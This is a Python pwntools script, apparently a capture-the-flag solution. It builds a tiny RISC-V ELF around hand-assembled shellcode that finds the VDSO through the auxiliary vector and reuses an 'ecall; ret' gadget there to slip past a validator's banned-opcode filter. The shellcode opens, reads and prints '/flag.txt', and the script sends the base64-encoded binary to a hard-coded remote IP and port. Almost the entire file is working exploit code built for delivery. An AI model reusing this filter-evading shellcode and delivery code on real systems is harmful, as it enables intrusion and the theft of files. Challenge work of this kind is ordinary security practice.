#!/usr/bin/env python3
"""
Golfing solver — hand-builds the smallest RISC-V ELF64 that the remote
validator will accept, wraps a VDSO-gadget syscall shellcode inside it,
and sends it over as base64.
"""
import base64
import struct
import sys

from pwn import remote

HOST, PORT = "15.235.202.47", 9002

EHDR_SIZE = 0x40
PHDR_SIZE = 0x38
SHDR_SIZE = 0x40
NUM_PHDRS = 2
NUM_SHDRS = 3

CODE_SEGMENT_VA = 0x10000
DATA_SEGMENT_VA = 0x210000
ENTRY_VA = 0x100B0

MAX_ELF_SIZE = 0x1E1
MAX_TEXT_SIZE = 0x71
BANNED_OPCODE_BYTES = (b"\x73\x00\x00\x00", b"\x73\x00\x10\x00", b"\x02\x90")

# Shellcode assembled by hand for entry point 0x100b0. Walks argc/argv/envp
# to reach the auxiliary vector, pulls AT_SYSINFO_EHDR (the VDSO base) out
# of it, adds the fixed +0xc50 offset to a bare `ecall; ret` gadget inside
# the VDSO, then uses that gadget for openat("/flag.txt") -> read -> write.
SHELLCODE = bytes.fromhex(
    "0a879307100214632107e39ef6fe0063"
    "85673e94130404c51305c0f997050000"
    "938525030146930880030294aa842685"
    "8a85130600109308f00302942a860545"
    "93080004029401459308d00502942f66"
    "6c61672e74787400"
)


def elf_header(shoff: int) -> bytes:
    ident = bytearray(16)
    ident[0:4] = b"\x7fELF"
    ident[4], ident[5], ident[6] = 2, 1, 1  # ELFCLASS64, little-endian, EV_CURRENT

    rest = struct.pack(
        "<HHIQQQIHHHHHH",
        2,               # e_type = ET_EXEC
        0xF3,            # e_machine = EM_RISCV
        1,               # e_version
        ENTRY_VA,
        EHDR_SIZE,       # e_phoff
        shoff,           # e_shoff
        0,               # e_flags
        EHDR_SIZE,       # e_ehsize
        PHDR_SIZE,
        NUM_PHDRS,
        SHDR_SIZE,
        NUM_SHDRS,
        2,               # e_shstrndx
    )
    return bytes(ident) + rest


def program_header(flags: int, vaddr: int, filesz: int, memsz: int) -> bytes:
    # p_offset = 0 for both segments: the code segment's file content
    # starts at the very first byte of the ELF (the header itself is part
    # of what gets mapped, since vaddr 0x10000 is where byte 0 of the file
    # lands), and the data segment has filesz=0 so its offset is unused.
    return struct.pack(
        "<IIQQQQQQ",
        1,          # p_type = PT_LOAD
        flags,      # p_flags: 5 = R+X, 6 = R+W
        0,          # p_offset
        vaddr,
        vaddr,
        filesz,
        memsz,
        0x1000,     # p_align
    )


def section_header(name_off: int, sh_type: int, addr: int, off: int, size: int, addralign: int) -> bytes:
    return struct.pack(
        "<IIQQQQIIQQ",
        name_off,
        sh_type,
        6 if sh_type == 1 else 0,  # sh_flags: SHF_ALLOC|SHF_EXECINSTR for .text, 0 for .shstrtab
        addr,
        off,
        size,
        0,          # sh_link
        0,          # sh_info
        addralign,
        0,          # sh_entsize
    )


def build_elf() -> bytes:
    text_off = EHDR_SIZE + PHDR_SIZE * NUM_PHDRS
    text_va = CODE_SEGMENT_VA + text_off
    shoff = text_off + len(SHELLCODE)
    shstrtab = b"\x00.text\x00.shstrtab\x00"
    total_size = shoff + SHDR_SIZE * NUM_SHDRS

    elf = bytearray(total_size)
    elf[:EHDR_SIZE] = elf_header(shoff)

    code_phdr = program_header(flags=5, vaddr=CODE_SEGMENT_VA, filesz=total_size, memsz=0x1000)
    elf[EHDR_SIZE : EHDR_SIZE + PHDR_SIZE] = code_phdr

    data_phdr = program_header(flags=6, vaddr=DATA_SEGMENT_VA, filesz=0, memsz=0x1000)
    elf[EHDR_SIZE + PHDR_SIZE : EHDR_SIZE + 2 * PHDR_SIZE] = data_phdr

    elf[text_off : text_off + len(SHELLCODE)] = SHELLCODE

    shstr_off = shoff + 0x2F
    elf[shstr_off : shstr_off + len(shstrtab)] = shstrtab

    elf[shoff + SHDR_SIZE : shoff + 2 * SHDR_SIZE] = section_header(
        name_off=1, sh_type=1, addr=text_va, off=text_off, size=len(SHELLCODE), addralign=2
    )
    elf[shoff + 2 * SHDR_SIZE : shoff + 3 * SHDR_SIZE] = section_header(
        name_off=7, sh_type=3, addr=0, off=shstr_off, size=len(shstrtab), addralign=1
    )

    validate(elf)
    return bytes(elf)


def validate(elf: bytes) -> None:
    if not (0xB0 <= len(elf) <= MAX_ELF_SIZE):
        raise ValueError(f"ELF size {len(elf)} outside accepted range")
    if len(SHELLCODE) > MAX_TEXT_SIZE:
        raise ValueError(f".text too large: {len(SHELLCODE)} bytes")
    for pattern in BANNED_OPCODE_BYTES:
        if pattern in elf:
            raise ValueError(f"banned opcode bytes present: {pattern.hex()}")
    for i in range(len(SHELLCODE) - 3):
        if len(set(SHELLCODE[i : i + 4])) == 1:
            raise ValueError(f"four identical bytes in a row at offset {i:#x}")


def main() -> int:
    elf = build_elf()
    payload = base64.b64encode(elf)
    print(f"[+] shellcode: {len(SHELLCODE)} bytes, ELF: {len(elf)} bytes, base64: {len(payload)} bytes")

    io = remote(HOST, PORT, timeout=10)
    io.recvuntil(b"base64): ")
    io.sendline(payload)
    print(io.recvall(timeout=5).decode(errors="replace"))
    return 0


if __name__ == "__main__":
    sys.exit(main())
